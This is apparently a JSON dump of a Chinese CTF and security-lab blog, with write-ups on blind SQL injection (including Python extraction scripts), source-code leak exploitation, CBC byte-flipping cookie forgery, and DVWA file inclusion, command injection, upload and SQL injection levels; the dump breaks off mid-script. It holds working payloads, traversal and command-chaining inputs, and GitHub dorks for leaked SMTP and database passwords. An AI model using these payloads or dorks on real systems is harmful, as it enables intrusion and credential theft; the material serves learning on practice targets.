{"posts":[{"title":"BUGKU WEB36","text":"这关可以说的东西还挺多，涉及盲注，以及有关数据库一些数据转化，还有盲注脚本的编写，所以单独拿出来讲一下。 收集信息打开页面后，发现只有一个登录框，想的就是SQL注入，在尝试了几种写法，以及利用sqlmap跑后，没啥收获，因为不知道过滤了什么，接下来扫了一下URL，看看有没有后台可以提供其他信息扫到了一个image，打开以后，得到这张图片，感觉还是要SQL注入‘-(mid((passwd)from(-1))=’t’)-‘ fuzz测试过滤内容利用burp进行fuzz测试看一下都有哪些字符被过滤了一开始的时候构造了一个admin'+ 1'1去跑字典，替换的是那个+号发现不管什么字符都被过滤了的样子，然后想了一下，会不会是空格被过滤了呀？？，然后使用了admin’ 1’1 果然是这样，单引号没被过滤，但是空格被过滤了，接下来在用空格跑一遍字典试试 发现还是有一些没过滤的，比如说ascii select mid ，还有一些字符，而且，提示的那些字符是没过滤的，解题方向大概率就是盲注了，应该就是要编写脚本，那么我们知道编写脚本，需要知道条件，构造语句等等，所以继续构造SQL注入探索看看 利用现有字符构造注入语句在继续SQL注入的时候发现，如果闭合引号，有两种不同情况:1.一种是2.另一种是 意味着什么呢：password意味着不存在该账号username意味着存在该账号为什么呢？继续看下面 这里查找了一下网上大神们的write up，发现这里闭合引号的方式使用减号闭合的，其实不是很能理解为啥？等找到答复再回来补吧问完学长以后发现是这样的：其实那个减号起的不是闭合作用，我们闭合就是用单引号闭合了，总结下来就是两点:1.后面的负号起的不是闭合引号的作用，而是以运算为媒介的连接作用2.为什么需要这个负号，是因为如果缺少这个负号，我们想输入的查询整体就会被分割3.那其实就是说这个负号可以更换任意其他的运算符 总而言之，这里的payload，可以暂时写为: 1admin'-0-' 我在使用 这里需要引入一个知识点: 就是上面这个username=0，所有数据都出来的原因，因为这个里的username定义为字符串，当遇到int类型的数据的时候，字符串会自动转化为int类型和这个0去匹配，而转化为int类型以后的数据为0所以，所有为都为字符组成的字符串就都和这个0匹配，所以全都罗列出来了参考:https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-vhttps://blog.csdn.net/HaHa_Sir/article/details/93666147 SQL注入语句构造接下来就是构造盲注语句，这里我们需要考虑，想要获取的时候什么根据上面那张图片给的提示，大概语句是(mid((字段名)from(i)))=’j;这个时候问题来了，字段名是啥，看了一下网上大神说的，根据表单提交的是passwd所以猜测是passwd，这个和数据库中的字段名是不一样的，就是猜测，接下来就是脚本的编写了， 首先是mid()函数:mid(‘对象’，开始位置（从1开始），长度);但是在这题中，逗号也被过滤了，所以这样写是行不通的，根据提示，我们需要利用from: 构建以下payload，如果mid为真则为1，那么admin-1就不为0，那么就不会查询得出 1admin'-(mid((passwd)from(-1))&gt;'0')-' 在这里，如果mid这里为真则为1，我们知道admin’-1-‘在数据库查询为空，即为username wrong，反之同理 参考：https://xz.aliyun.com/t/2583接下来是写post类型的脚本: 直接贴出来吧 这里有必要说几个细节1.网页的URL有两个 一个index.php，就是框框那边，另一个是login.php，这个才是回显的页面，所以你要发送post到这个页面去2.这里我用了两次逆序，因为mid只能从后面截取，所以用了切片法进行逆序 123456789101112131415161718192021import requestss=requests.session()url = &quot;http://114.67.246.176:11969/login.php&quot;headers = {'Cookie': 'PHPSESSID=34kfhvoilevqk4p779t36qc2j5'}password = &quot;&quot;for i in range(1,33): for j in '0123456789abcdef': payload =f&quot;admin'-(mid((passwd)from(-{i}))='{j}{password}')-'&quot; print(payload) data = {'uname': payload,'passwd': 'sky'} # print(s.post(url,data=data).text) if 'username error!!' in s.post(url=url,data=data,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#可不用，是用来调试的 password += j strA = password password = strA[::-1] print(password) break 得到结果以后发现是md5加密，拿去解密，得到bugkuctf，然后登陆一下，他说 这边说要ls命令？查了一下其实可以用catLinux cat命令cat命令:命令用于连接文件并打印到标准输出设备上。 cat&gt;/filenamehttps://www.runoob.com/linux/linux-comm-cat.htmlhttp://blog.sina.com.cn/s/blog_52f6ead0010127xm.html 小结：感觉从这关学到了挺多东西的:1.对于盲注的理解更深了，比如如何去构造闭合语句2.mysql一些更基础的东西3.脚本的编写也更加得心应手了，因为其实模板都一样4.信息收集的重要性——盲注语句的编写，,过滤了什么5.一些细节要注意哇！！！","link":"/2021/02/01/BUGKU-WEB36/"},{"title":"CTF中常见源码泄露","text":"SVN源码泄露SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息） 更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。 利用工具SvnHack git源码泄露Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。 利用工具GitHackpy -2.7 GitHack.py -u hg源码泄露Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg文件 利用需要perlgithub项目地址：https://github.com/kost/dvcs-ripper perl rip-hg.pl -v -u url cvs漏洞泄露CVS是一个C/S系统，是一个常用的代码版本控制软件。主要在开源软件管理中使用。与它相类似的代码版本控制软件有subversion。多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。CVS版本控制系统是一种GNU软件包，主要用于在多人开发环境下的源码的维护。但是由于之前CVS编码的问题，大多数软件开发公司都使用SVN替代了CVS。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 利用github项目地址：https://github.com/kost/dvcs-ripper.git 运行示例: perl rip-cvs.pl -v -u http://www.example.com/CVS/ Bazaar/bzr泄露原理Bazaar（bzr）是另一个开源的 DVCS（Distributed Version Control System，即分布式版本控制系统），它试图给 SCM（Source Code Management，即源码管理） 的世界里带来一些新的东西。 bzr 是 Canonical 公司支持的一个项目，也就是 Ubuntu Linux 的发行公司。简单来说，bzr 是用 python 编写的，用于版本控制。 利用perl rip-bzr.pl -v -u http://www.example.com/.bzr/ 网站备份压缩文件管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。 常见备份文件后缀.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gz.index.php.swowww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rarimage.php.bak WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF 主要包含一下文件或目录： WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等) 通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 SWP 文件泄露swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。 漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。 github源码泄露GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。 github常见搜索语法in:name test #仓库标题搜索含有关键字 SpringCloudin:descripton test #仓库描述搜索含有关键字in:readme test #Readme文件搜素含有关键字stars:&gt;3000 test #stars数量大于3000的搜索关键字stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test #forks数量大于1000的搜索关键字forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字size:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字user:test #用户名搜素license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字language:java test #在java语言的代码中搜索关键字user:test in:name test #组合搜索,用户名test的标题含有test的 Google邮箱搜索使用 Github 进行邮件配置信息收集 很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如 果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。 site:Github.com smtp site:Github.com smtp @qq.com site:Github.com smtp @126.com site:Github.com smtp @163.com site:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp 数据库信息搜集site:Github.com sa password site:Github.com root password site:Github.com User ID=’sa’;Password site:Github.com inurl:sql .DS_Store泄露.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 利用github项目地址:https://github.com/lijiejie/ds_store_exp使用下载后，进入目录更新python2库 pip install -r requirements.txtpython ds_store_exp.py http://6974-59fce729-40f6-4124-a2c9-a5a66673dc66node3.buuoj.cn:28261/.DS_Store 参考：https://www.cnblogs.com/Lmg66/p/13598803.html","link":"/2021/02/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"title":"CBC字节翻转攻击","text":"CBC加密流程首先将明文分组，常见的以16个字节为一组，位数不足的使用特殊字符填充——&gt;生成一个随机的初始化向量(IV)和一个密钥——&gt;将IV和第一组明文异或——&gt;用密钥对3中XOR后产生的密文加密——&gt;用4中产生的密文对第二组明文进行XOR操作——&gt;用密钥对5中产生的密文加密——&gt;c重复步骤4-7，到最后一组明文——&gt;将IV和加密后的密文拼接在一起，得到最终的密文。 Plaintext：待加密的数据——也就是明文 IV：初始化向量，用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。 Ciphertext：加密后的数据——也就是密文 Key：密钥 CBC解密过程 从密文中提取出IV，然后将密文分组——&gt;使用密钥对第一组的密文解密，然后和IV进行xor得到明文——&gt;使用密钥对第二组密文解密，然后和2中的密文xor得到明文——&gt;重复2-3，直到最后一组密文 攻击原理Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了。注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。 参考:https://maplege.github.io/2018/11/19/CBC-reverse/ 异或运算123已知A=B^C可以得到结论B=A^C并且也能得到A^C^B=0 攻击核心1234设第一块的密文第4个字节设为变量A，第二块的明文中第4个字节设为变量C，在第二块加密产生的第4个字节设为变量B因为A^B=C，根据结论有B=A^C如果人为将A变量值改变为A^C的结果，那么参与运算后A^B将等于A^C^B=B^B=0，第二个产生的明文的第4个字节将变为0如果将A变量值改变为A^C^X（这里X是任意字符），那么参与运算后，A^B将等于A^C^X^B=B^X^B=X，第二个产生的明文的第4个字节将变为X字符，这样，第二块密文块解密的结果就可控了 实践首先先扫一下目录，看看有没有源码可以看到有一个有文件，打开以后发现，由于不管怎么打开都是乱码，所以直接复制了网上wp的源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//设置cookie的流程调用的函数，返回一个随机的iv和使用该iv加密的post提交的username和password的结果——cipherfunction login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}//检查函数，这里是对cookie中cipher和iv进行CBC翻转的利用点function check_login(){ //如果cookie中设置了cipher和iv参数 if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ //将cipher和iv参数都进行base64解码 $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); //进行CBC模式的AES解密 if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ //对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值 $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $_SESSION['username'] = $info['username']; }else{ die(&quot;ERROR!&quot;); } }}//根据session中username参数，控制显示结果function show_homepage(){ //如果session中的username为admin，则返回flag if ($_SESSION[&quot;username&quot;]==='admin'){ echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; }else{ echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; } echo '&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;';}//检查是否带有username和password参数，如果有参数，进入设置cookie的路径//如果没有设置参数，进入判断cookie路径if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = (string)$_POST['username']; $password = (string)$_POST['password']; //不允许提交的username为admin if($username === 'admin'){ exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); }else{ $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); }}else{ //如果session中的username字段已经存在了，既登陆过了，则进入 if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); }else{ ................. } 上面说，不让我们直接提交admin，但是又说结果需要admin，联想到上面的攻击原理，改变解码中的某个字节，指挥影响该段明文，以及下一段明文对应的字节，也就是说我们要构造xdmin，或者axmmin，然后通过CBC字节翻转攻击，是的x还原为a或d。。。 攻击过程代码中涉及到了序列化，数组序列化结果参考如下（这里使用ydmin和123作为username和password）： a:2:{s:8:&quot;username&quot;;s:5:&quot;ydmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;}到这里，算是大致理解这个CBC翻转字节攻击是如何实现的了，首先我们知道前一段密文会影响后一段明文的解密，所以我们就对第一段a:2:{s:8:&quot;userna的密文进行修改，使得在于第二段密文异或运算时ydmin变成admin这个时候，我们将修改后的密文直接拿去也是不行的，因为这个时候IV没有更换，前面的数据会出现匹配乱码我们知道 第一节明文=IV^第一节密文所以 新IV=第一节明文^第一节密文（修改之前的，因为修改之前的密文所对应的明文才是正确的） 编写脚本123456789101112131415161718192021222324import base64import urllibcipher=&quot;ut%2F2iZbrbm1dq9PpRb0dUGN5xneMrTkNo1pMCTL6DjhABvPsODND9N%2BLwENXWiXXPyy5PQ7YXn2HCfcIkYNAIw%3D%3D&quot;iv=&quot;Ub5Pn6gmMNuctLwfJggaOA%3D%3D&quot;cipher_de=base64.b64decode(urllib.unquote(cipher))tran='a:2:{s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:3:&quot;123&quot;}8:&quot;passwor'#tran[16:32]=me&quot;;s:5:&quot;bdmin&quot;;# 这里用之前的攻击核心的字母来指代一下 A ^ c ^ x cipher_new=cipher_de[0:9]+chr(ord(cipher_de[9])^ord('b')^ord('a'))+cipher_de[10:]cipher_new=urllib.quote(base64.b64encode(cipher_new))print(cipher_new)cipher_new=base64.b64decode('wXAR7J/AKHmukMZ9U0lgO21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==')#这里记得用burp跑出来的那个，不然待会又解码不吻合。print(cipher_new)iv_raw=base64.b64decode(urllib.unquote(iv))iv_new=''for i in range(0,16):# iv_new+=chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))iv_new=urllib.quote(base64.b64encode(iv_new))print(iv_new) 最后也终于是拿到了flag 小结一开始做的时候，就看不下去了，因为感觉很陌生，而且又感觉很绕，但其实只要专注看一会，其实很快就可以理解了卡了比较久的地方是，删除下面post 的内容的时候，把那一行删掉就行了，不要不要把那一行上面那行空白的也删掉，这样是跑不出来的，每次都手贱直接整个删掉，然后就好久都没出来结果，无语了。。参考:https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no https://www.jianshu.com/p/a958f757a2b2","link":"/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"},{"title":"DVWA-file including","text":"其实已经做过好多文件包含的练习，但是都是比较零碎的题目这次就整体一起来总结一下吧： 文件包含漏洞简介1.文件包含可以分为本地文件包含和远程文件包含两种。文件包含和文件上传一样本身并不是漏洞，而是攻击者利用了包含的特性加上了应用本身对文件控制不严格，对include进来的文件不可控，才导致了一系列的危害2.本地文件包含就是通过URL将服务器本地的其他文件include进来。远程文件包含就是将远程服务器的文件include进来3.最主要的是，包含进来的文件都是以当前脚本文件解析，例如在apache+PHP环境，那么被include进来的文件，不管是什么类型，例如图片，文本文档，都会被当成php脚本来解析 本地文件包含通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行总的来说就是被包含的文件再服务器本地 远程文件包含在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露，拒绝服务攻击，甚至在目标服务器上执行代码简单的说，就是被包含的文件在第三方服务器 常见函数1234567Include()当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。Require()require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。include_once()和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。require_once()功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次 小tips12345/ 根目录./ 是当前目录../ 返回到上一级目录../../ 返回了两级目录.\\ 、..\\和./、../意义相同 DVWA练习low本地文件包含：在low级别中 123&lt;?php $file = $_GET[ 'page' ]; ?&gt; 这个对get的page没有任何过滤 123456if( isset( $file ) ) include( $file );else { header( 'Location:?page=include.php' ); exit;} 在index.php文件中发现inlude() 所以有文件包含漏洞构建 1?page=../../phpinfo.php 有的人会问，你怎么知道上移两级可以找到这个文件？当然不知道呀，试出来的 远程文件包含我们现在我们www下构建一个文件然后通过输入URL进行打开这里需要注意的是，文件名不能包含空格之类的字符，不然到时候会被被编码成%20反而找不到文件了 medium1$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); 在这个关卡中，使用了两个正则过滤了以上字符 本地文件包含尝试一下使用复写的方式进行绕过： 1?page=..././..././phpinfo.php 好的绕过成功 感觉过滤绕过的方法都很像，所以要经常复习！ 远程文件包含1payload：?page=Http://url //在这里也是直接采取大小写拼接，或者复写都可以 high12345if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { echo &quot;ERROR: File not found!&quot;; exit; } fnmatch() 函数根据指定的模式来匹配文件名或字符串。这里使用fnmatch检查page参数，必须是file*问：file*是什么类型？这里指的是需要file协议类型:定义本地文件传输协议 ,file协议主要用于访问本地计算机中的文件.file协议的格式： 1file:///+绝对路径 https://www.cnblogs.com/lishanlei/p/9327646.html所以这里我们需要知道绝对路径才行，不能在使用../退格 impossible难度直接白名单，简单粗暴没啥好说– 小结存在文件包含漏洞，我觉得很大的作用是获取路径信息或者其他有用信息为文件上传get shell 做准备1.报错产生文件路径2.通过已有的路径，猜解服务器绝对路径","link":"/2021/01/23/DVWA-file-including/"},{"title":"DVWA靶场","text":"Brute Forcelow：暴力破解——burpsuit去跑就行了或者使用sql注入：admin’|| 1=’1、admin’# medium使用了mysql_real_escape_string函数进行过滤复习一下过滤了啥 回想一下当时是怎么bypass的？ 因为那一关有用gbk进行编码，所以我们可以使用宽字节注入的方式吃掉\\ 这里没有看到GBK编码 所以我们只能继续使用burp suit跑字典 这边有个睡眠两秒的放爆破机制？感觉好像蛮鸡肋的，就是等的时间长点而已，最后还是能跑出来的 high除了在原由的防sql注入的基础上又添加了stripslashes函数——用于去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个，所以sql注入似乎变得不太可能了burpsuit暴力破解也不行，因为它每次都需要提交一个不同的token所以这里只能用脚本来暴力破解：脚本的编写还没学完，等学完再来补充 Command Injection命令执行和代码执行的原理分析有些会需要调用一些执行系统命令的函数，比如PHP中的：system ， exec ， shell_exec ， passthru ， popen ， proc_popen 等函数…如果用户可以控制这些函数的参数，那么把参数替换成自己的恶意命令，是不是就可以操作系统一些命令了？这就是命令执行。 命令行注入 命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。命令连接符command1 &amp;&amp; command2 先执行command1后执行command2command1 | command2 只执行command2command1 &amp; command2 先执行command2后执行command1 以上三种连接符在windows和linux环境下都支持如果程序没有进行过滤，那么我们就可以通过连接符执行多条系统命令。在本题中源代码没有体现对ip的任何过滤 系统命令整理：windows下：https://www.shuzhiduo.com/A/Vx5MBqZLdN/linux下：https://www.cnblogs.com/54chensongxia/p/12510758.html 那么这题如何解答就很明了了，我们该如何利用这写系统命令函数，就是利用这些命令连接符 low：认识几个函数：shell_exec()函数是PHP中的一个内置函数，用于通过shell执行命令并以字符串的形式返回完整的输出。stristr(string,search,before_search)stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。php_uname(mode)这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 然后接下来输入 ping&amp;&amp;系统命令； medium在这一关中 过滤了&amp;&amp; 和; 看看上面的命令连接符，还有&amp; |等其他符号可以使用那么这里为什么要过滤；呢？ 在linux系统当中是可以用；号来替换这些命令连接符的 那么如果一定要用&amp;&amp;该如何绕过呢这里看到”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。 high在这一关中，过滤了很多了，但是仔细观察，发现过滤的不是|而是|+一个空格 我就纳闷了，为啥不直接过滤| 为了让我们过了这个关卡吗？有点小无语哈哈哈，总而言之我们输入127.0.0.1|net user impossibleimpossible关卡的过滤机制让我想到了刚刷完的upload，也是类似的先把其他字符给过滤掉，然后用.分割成多个数组，分别验证是否为数字，再将这几个数组进行拼接 ANTI CSRF TOKEN：这个是用来防范csrf攻击的，但是csrf是什么？还没学到，我看下面的题目有，先接着做吧https://blog.chenhaotaishuaile.com/2019/03/16/csrf-token-generate/ 文件上传low这里让我们上传一张图片，直接上传然后burp抓包改后缀他的相对路径已经出来了，接下来就是猜解其绝对路径 1http://localhost:81/DVWA-master/hackable/uploads/123.php medium在中级的题目中，验证了后缀是是否jpg和png图片格式后缀的方法一：burp改后缀方法二：上传文件后利用上一关的文件包含漏洞方法三：因为有move_uploaded_file()函数，所以可以尝试一下00截断上传jpg high和之前差别不大，但是多了getimagesize()这个函数，意味着这里要是用图片木马将图片和木马用 1copy 1.jpg/b+2.php/a 12.jpg impossiblein_get(varname)函数返回相应选项的值imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回falseimagejpeg ( image , filename , quality)从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。imagedestroy( img )函数销毁图像资源 sql injectionlow：1.字符型 注入——1’or 1=1’1 /1’or 1=1#2.payload: 12345union selct联合注入：1'order by 2# ——有两列1'union select 1,2#1' union select database(),2#1'union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'# payload 12extractvalue报错注入1' and extractvalue(1,concat('~',database(),'~'))# medium 这一关使用下拉选择的方式进行登录，所以就没办法在这里进行注入，我们知道这是POST类型提交数据，所以，这里我们尝试一下抓包进行修改数据 ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125083457.png) 可以发现，他这次对’和\\都过滤了，实现转义 然后回到起点，发现，这次是数字型注入啊？？？那个过滤方式有啥意义吗？？payload: 121 union select 1,database()#1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761//这里由于过滤了单引号，所以只能用16进制进行编码然后绕过，dvwa=0x64767761 payload: 11 and extractvalue(1,concat(1,database()))# high很奇怪，我输入1’ union select 1,database()#后 页面变成并且怎么刷新返回重启都没用 impossible1234567891011121314151617181920212223242526if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );//这个token可以用来防止sqlmap吧，因为每一次的提交都要重新提交一个token // Get input $id = $_GET[ 'id' ]; // Was a number entered?if(is_numeric( $id )) { // Check the database$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );//bindParam()：绑定一个参数到指定的变量名，在这里他就是让id为int类型的变量$data-&gt;execute();$row = $data-&gt;fetch(); 根据以上的解析，所以基本上不存在注入点了 sql injection(blind)low因为他的返回结果只有存在或者不存在在数据库当中，所以我们这里只好尝试使用盲注:这里编写一个盲注脚本,前面发现是字符型注入，get类型，查看源码发现没有过滤，所以直接编写脚本: 猜解数据库长度 12345678910111213141516import requestss=requests.Session()url=&quot;http://localhost:81/DVWA-master/vulnerabilities/sqli_blind/&quot;headers={'Cookie':'security=low;PHPSESSID=45nnfme23ea8iumsihnr6gqc7i; night_mode=0'}print(&quot;---开始猜解数据库名长度---&quot;)for j in range(0,50): database_length=&quot;?id=1\\'and+length(database())='%d'--+&amp;Submit=Submit#&quot;%j#这里的语句还可以替换成:#database_length=f&quot;?id=1\\'and+length(database())={j}--+&amp;Submit=Submit#&quot;#database_length='?id=1\\'and+length(database())='+str(j)+'--+&amp;Submit=Submit#' if 'exists' in s.get(url+database_length,headers=headers).text: databaselength = j #print(s.get(url+database_length,headers=headers).text) print(url+database_length) print(&quot;数据库的长度为&quot; + str(databaselength)) break 猜解数据库的名字: 123456789print(&quot;-----开始猜解数据库名-------&quot;)databasename = ''for j in range(1,databaselength+1): for i in payloads: database_payload=f&quot;?id=1\\'and+substr(database(),{j},1)='{i}'%23&amp;Submit=Submit#&quot; print(database_payload//调试用的 if 'exists' in s.get(url+database_payload,headers=headers).text: databasename +=iprint('数据库的名字为:'+databasename) 查询表的数目: 12345678print(&quot;-----开始猜解表数-------&quot;)for j in range(0,50): table_count=f&quot;?id=1'and (select count(table_name)from information_schema.tables where table_schema=database())={j}%23&amp;Submit=Submit#&quot; print(table_count) if 'exists' in s.get(url+table_count,headers=headers).text: tablecount=j print(&quot;表的数目是&quot;+str(tablecount)) break 查询表名 1234567891011121314151617print(&quot;-----开始猜解表名-------&quot;)for j in range(0, tablecount): table_name = '' for i in range(0, 50): tab_length = f'?id=1\\'and (select length(table_name) from information_schema.tables where table_schema=database() limit {j},1)={i}%23&amp;Submit=Submit#' # print(tablength) if 'exists' in s.get(url + tab_length, headers=headers).text: tablength = i print(&quot;第一个表长度为:%d&quot; % i)#以上是为了得出每一个表的长度 for m in range(0, tablength+1): for n in payloads: table_payload = f'?id=1\\'and substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{m},1)=\\'{n}\\'%23&amp;Submit=Submit#' #print(table_payload) if 'User ID exists in the database.' in s.get(url + table_payload, headers=headers).text: table_name += n print('table_name%d:'%(j+1)+table_name) 查询列名 123456789101112131415161718192021222324columnNum = 0 for j in range(50): columnNum_payload = '?id=1\\' and (select count(column_name) from information_schema.columns where table_name=\\'flagishere\\')='+str(j)+' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+columnNum_payload, headers=headers).text: columnNum = j breakprint('columnNum: '+str(columnNum))# 2.爆出每个字段名的长度for j in range(0,columnNum): column_name = '' for i in range(1,50): columnLen_payload = '?id=1\\' and length(substr((select column_name from information_schema.columns where table_name=\\'flagishere\\' limit '+str(j)+',1),1))='+str(i)+' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+columnLen_payload, headers=headers).text: columnLen = i print('column'+str(j+1)+'_length: '+str(columnLen)) # (2)内部循环爆破每个表的表名 for m in range(1,columnLen+1): for n in payloads: 